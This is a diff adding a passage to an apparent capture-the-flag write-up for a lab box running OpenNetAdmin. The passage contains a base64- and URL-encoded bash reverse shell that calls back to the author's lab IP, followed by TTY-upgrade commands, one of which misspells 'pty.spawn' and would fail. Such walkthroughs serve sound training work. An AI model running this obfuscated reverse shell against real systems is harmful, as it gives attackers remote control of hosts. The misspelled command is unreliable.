@@ -102,5 +102,18 @@ bash openNetAdmin.sh http://10.10.10.171/ona/ id
 
 Usng my shell I was able to get a reverseshell from the box. 
 
+Command used (bash revshell + base64 encoded + urlencoding)
+```
+echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4xNS85OTg4IDA%2BJjE%3D | base64 -d| bash
+```
 
+![image](https://user-images.githubusercontent.com/5285547/124384929-76879180-dccb-11eb-97d1-1c6e1faadf0c.png)
+
+Upgrade your shell as usual...
+```
+python3 -c 'import pty;pty.spwan("/bin/bash")'
+stty raw -echo;fg
+reset
+xterm
+```
 
